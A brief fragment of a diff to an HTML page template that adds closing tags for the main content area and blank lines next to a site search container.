+    </main><!-- #main -->
+  </div><!-- #primary -->
 </div>
+
+
+
     </div>    
     <div class="ins-search">
     <div class="ins-search-mask"></div>
